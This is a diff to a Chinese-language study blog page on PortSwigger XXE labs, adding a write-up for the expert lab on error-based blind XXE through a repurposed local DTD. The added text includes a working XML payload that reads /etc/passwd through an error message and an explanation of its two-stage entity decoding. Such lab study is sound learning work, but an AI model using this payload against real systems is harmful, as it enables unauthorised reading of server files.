@@ -1,6 +1,8 @@
 ---
 title: PortSwigger XML external entity (XXE) injection
 description: PortSwigger XML external entity (XXE) injection
+last_update:
+  date: "2025-08-27T08:00:00+08:00"
 ---
 
 ## Lab: Exploiting XXE using external entities to retrieve files
@@ -278,7 +280,49 @@ Client 端
 | Document  | https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-by-repurposing-a-local-dtd        |
 | Lab       | https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd |
 
-## 名詞介紹
+這題是 Expert 等級，但其實只要照著範例 + Hint 改一下就好
+
+```xml
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+```
+
+HTML Entity 解碼過程
+
+```
+&#x25; => %
+&#x26; => &
+&#x27; => '
+```
+
+解碼後
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+```
+
+這個比較特別，會經過兩階段的解碼
+
+```
+&#x26;#x25; => &#x25; => %
+```
+
+我覺得，能想到這種 payload 的，根本是鬼才，要對 XML 的解析機制有很深入的了解吧！我光是要理解 payload 都有難度了...
+
+## 小結
+
+學完 XXE 之後，覺得還是很虛，要我在現實世界找到 XXE，我應該還是找不到，加上現代也很少用 XML 吧...基本上都是 JSON，我只有在 WordPress 的 `/xmlrpc.php` 看過 XML 傳輸格式而已。之後應該會再花時間補一下 XML 的基本語法，不然感覺沒有完整的學習到QQ
 
 ## 參考資料
 
